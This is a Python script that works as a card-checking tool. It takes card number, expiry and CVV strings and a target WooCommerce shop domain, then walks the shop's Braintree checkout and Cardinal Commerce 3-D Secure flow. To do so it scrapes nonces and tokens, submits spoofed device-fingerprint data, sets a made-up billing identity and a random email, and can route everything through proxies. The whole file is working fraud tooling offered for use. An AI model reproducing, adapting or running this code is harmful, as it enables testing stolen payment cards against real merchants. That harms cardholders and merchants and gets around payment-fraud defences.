from uuid import uuid4
import requests
import base64
import random
import string
import uuid
import json
import re

def stripTags(input_string):
    cleaned = re.sub(r'</?[^>]+(>|$)', '', input_string)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned

def lookup_api(domain, creditCard, proxy):
    G = "\033[38;5;82m"
    Y ="\033[38;5;226m"
    R2 = "\033[38;5;202m"
    R = "\033[0m"
    cc, mm, yy, cvv = creditCard.strip().split('|')
    session = requests.Session()

    if proxy:
        session.proxies = proxy

    #requests 1
    try:
        url = f"https://{domain}/?=&post_type=product"

        response = session.get(url, proxies=proxy)
        split_text = response.text.split('data-product_id="')
        if len(split_text) > 1:
            id = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} Product ID not found in the response.")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 1 An error occurred during processing: {e}")

    #requests 2
    try:
        url = f"https://{domain}/?wc-ajax=add_to_cart"
        data = {
            'quantity': 1,
            'add-to-cart': id
        }

        response = session.post(url, data=data, proxies=proxy)

        if response.status_code not in (200, 302):
            return print(f'[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} Failed to add item to cart.')

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 2 An error occurred during processing: {e}")
    
    #requests 3
    try:
        url = f"https://{domain}/checkout/"
        response = session.get(url, proxies=proxy)

        split_text = response.text.split('name="woocommerce-process-checkout-nonce" value="')
        if len(split_text) > 1:
            checkoutNonce = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} Checkout nonce not found in the response.")
        
        split_text = response.text.split('wc_braintree_client_token = ["')
        if len(split_text) > 1:
            authorizationFingerprint = json.loads(base64.b64decode(split_text[1].split('"')[0]))["authorizationFingerprint"]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} authorizationFingerprint not found in the response.")
        
    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 3 An error occurred during processing: {e}")
    
    #requests 4
    try:
        url = f"https://payments.braintree-api.com/graphql"
        data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(uuid4())
            },
            "query": """
                query ClientConfiguration {
                    clientConfiguration {
                        analyticsUrl
                        environment
                        merchantId
                        assetsUrl
                        clientApiUrl
                        creditCard {
                            supportedCardBrands
                            challenges
                            threeDSecureEnabled
                            threeDSecure {
                                cardinalAuthenticationJWT
                            }
                        }
                        applePayWeb {
                            countryCode
                            currencyCode
                            merchantIdentifier
                            supportedCardBrands
                        }
                        fastlane {
                            enabled
                        }
                        googlePay {
                            displayName
                            supportedCardBrands
                            environment
                            googleAuthorization
                            paypalClientId
                        }
                        ideal {
                            routeId
                            assetsUrl
                        }
                        kount {
                            merchantId
                        }
                        masterpass {
                            merchantCheckoutId
                            supportedCardBrands
                        }
                        paypal {
                            displayName
                            clientId
                            assetsUrl
                            environment
                            environmentNoNetwork
                            unvettedMerchant
                            braintreeClientId
                            billingAgreementsEnabled
                            merchantAccountId
                            currencyCode
                            payeeEmail
                        }
                        unionPay {
                            merchantAccountId
                        }
                        usBankAccount {
                            routeId
                            plaidPublicKey
                        }
                        venmo {
                            merchantId
                            accessToken
                            environment
                            enrichedCustomerDataEnabled
                        }
                        visaCheckout {
                            apiKey
                            externalClientId
                            supportedCardBrands
                        }
                        braintreeApi {
                            accessToken
                            url
                        }
                        supportedFeatures
                    }
                }
            """,
            "operationName": "ClientConfiguration"
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {authorizationFingerprint}",
            "Braintree-Version": "2018-05-10"
        }

        response = session.post(url, json=data, headers=headers, proxies=proxy)

        split_text = response.text.split('"merchantId":"')
        if len(split_text) > 1:
            merchantId = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} merchantId not found in the response.")
        
        cardinalAuthenticationJWT = json.loads(response.text)["data"]["clientConfiguration"]["creditCard"]["threeDSecure"]["cardinalAuthenticationJWT"]

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 4 An error occurred during processing: {e}")
    
    #requests 5
    try:
        url = "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init"
        data = {
            "BrowserPayload": {
                "Order": {
                    "OrderDetails": {},
                    "Consumer": {
                        "BillingAddress": {},
                        "ShippingAddress": {},
                        "Account": {}
                    },
                    "Cart": [],
                    "Token": {},
                    "Authorization": {},
                    "Options": {},
                    "CCAExtension": {}
                },
                "SupportsAlternativePayments": {
                    "cca": True,
                    "hostedFields": False,
                    "applepay": False,
                    "discoverwallet": False,
                    "wallet": False,
                    "paypal": False,
                    "visacheckout": False
                }
            },
            "Client": {
                "Agent": "SongbirdJS",
                "Version": "1.35.0"
            },
            "ConsumerSessionId": None,
            "ServerJWT": cardinalAuthenticationJWT
        }

        response = session.post(url, json=data, proxies=proxy)

        split_text = response.text.split('"CardinalJWT":"')
        if len(split_text) > 1:
            CardinalJWT = split_text[1].split('"')[0]
            CardinalJWT = base64.urlsafe_b64decode(CardinalJWT.split('.')[1] + '=' * (4 - len(CardinalJWT.split('.')[1]) % 4)).decode('utf-8')
            ConsumerSessionId = json.loads(CardinalJWT)["ConsumerSessionId"]
            orgUnitId = json.loads(CardinalJWT)["Payload"]["URLs"]["DeviceFingerprint"]["QueryParameters"]["orgUnitId"]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} CardinalJWT not found in the response.")

    except Exception as e:
        print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 5 An error occurred during processing: {e}")

    #requests 6
    try:
        url = f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId={orgUnitId}&tmEventType=PAYMENT&referenceId={ConsumerSessionId}&geolocation=false&origin=Songbird"
        response = session.get(url, proxies=proxy)

        split_text = response.text.split('"nonce":"')
        if len(split_text) > 1:
            nonce = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} nonce not found in the response.")
        
    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 6 An error occurred during processing: {e}")
    
    #requests 7
    try:
        url = "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData"
        data = {
                "Cookies": {
                    "Legacy": True,
                    "LocalStorage": True,
                    "SessionStorage": True
                },
                "DeviceChannel": "Browser",
                "Extended": {
                    "Browser": {
                        "Adblock": True,
                        "AvailableJsFonts": [],
                        "DoNotTrack": "unknown",
                        "JavaEnabled": False
                    },
                    "Device": {
                        "ColorDepth": 24,
                        "Cpu": "unknown",
                        "Platform": "Win32",
                        "TouchSupport": {
                            "MaxTouchPoints": 0,
                            "OnTouchStartAvailable": False,
                            "TouchEventCreationSuccessful": False
                        }
                    }
                },
                "Fingerprint": str(uuid.uuid4()),
                "FingerprintingTime": 156,
                "FingerprintDetails": {
                    "Version": "1.5.1"
                },
                "Language": "en-US",
                "Latitude": None,
                "Longitude": None,
                "OrgUnitId": orgUnitId,
                "Origin": "Songbird",
                "Plugins": [
                    "Online document Plugin::Portable Document Format::application/x-google-chrome-pdf~pdf",
                    "Chrome PDF plug in::::application/pdf~pdf",
                    "PHLkaNt::CgYrVp78e2j47d1iZMOPuf2bNtWq0iZ::~BEK",
                    "3jwYUpzZ::l5kx3jwg3Epc1iRnb0DgQIECgQIMlxBA::~5o7"
                ],
                "ReferenceId": ConsumerSessionId,
                "Referrer": f"https://{domain}/",
                "Screen": {
                    "FakedResolution": False,
                    "Ratio": 1.0155210643015522,
                    "Resolution": "458x451",
                    "UsableResolution": "458x451",
                    "CCAScreenSize": "01"
                },
                "CallSignEnabled": None,
                "ThreatMetrixEnabled": False,
                "ThreatMetrixEventType": "PAYMENT",
                "ThreatMetrixAlias": "Default",
                "TimeOffset": -480,
                "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                "UserAgentDetails": {
                    "FakedOS": False,
                    "FakedBrowser": False
                },
                "BinSessionId": nonce
            }

        response = session.post(url, json=data, proxies=proxy)

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 7 An error occurred during processing: {e}")
    
    #requests 8
    try:
        url = "https://payments.braintree-api.com/graphql"
        data = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(uuid4())
            },
            "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        token
                        creditCard {
                            bin
                            brandCode
                            last4
                            cardholderName
                            expirationMonth
                            expirationYear
                            binData {
                                prepaid
                                healthcare
                                debit
                                durbinRegulated
                                commercial
                                payroll
                                issuingBank
                                countryOfIssuance
                                productId
                            }
                        }
                    }
                }
            """,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {authorizationFingerprint}",
            "Braintree-Version": "2018-05-10"
        }

        response = session.post(url, json=data, headers=headers, proxies=proxy)

        token = json.loads(response.text)["data"]["tokenizeCreditCard"]["token"]
        bin = json.loads(response.text)["data"]["tokenizeCreditCard"]["creditCard"]["bin"]

    except Exception as e:
        print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 8 An error occurred during processing: {e}")

    #requests 9
    try:
        url = f"https://api.braintreegateway.com/merchants/{merchantId}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
        data = {
            "amount": "9.99",
            "additionalInfo": {
                "billingLine1": "Dyer St",
                "billingCity": "Leeds",
                "billingPostalCode": "LS2 7LA",
                "billingCountryCode": "GB",
                "billingPhoneNumber": "+448978293110",
                "billingGivenName": "Anatole",
                "billingSurname": "M'Chirrie",
                "email": ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '@gmail.com'
            },
            "bin": bin,
            "dfReferenceId": ConsumerSessionId,
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.94.0",
                "cardinalDeviceDataCollectionTimeElapsed": 14,
                "issuerDeviceDataCollectionTimeElapsed": 575,
                "issuerDeviceDataCollectionResult": True
            },
            "authorizationFingerprint": authorizationFingerprint,
            "braintreeLibraryVersion": "braintree/web/3.94.0",
            "_meta": {
                "merchantAppId": domain,
                "platform": "web",
                "sdkVersion": "3.94.0",
                "source": "client",
                "integration": "custom",
                "integrationType": "custom",
                "sessionId": str(uuid4())
            }   
        }

        headers = {
            "authority": "api.braintreegateway.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": f"https://{domain}",
            "referer": f"https://{domain}/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        }

        response = session.post(url, json=data, headers=headers, proxies=proxy)

        print(response.text)

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 9 An error occurred during processing: {e}")